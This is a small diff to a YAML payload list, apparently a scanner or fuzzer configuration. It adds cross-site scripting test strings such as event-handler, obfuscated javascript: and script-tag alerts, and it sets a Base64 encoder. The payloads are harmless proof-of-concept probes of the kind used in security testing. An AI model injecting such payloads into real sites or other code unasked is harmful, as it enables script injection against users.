@@ -1,6 +1,10 @@
 payload:
+  - "<body onload=alert('test1')>"
+  - "<b onmouseover=alert('Wufff!')>click me!</b>"
+  - "<IMG SRC=j&#X41vascript:alert('test')>"
+  - '<script>alert("TEST");</script>'
   - '><script>evil(111)</script>'
-  - <img/src=x/onerror=xxx
+  - '<img/src=x/onerror=xxx'
   - '"onwheel=ead(111)'
 encoder:
   - Base64Flat
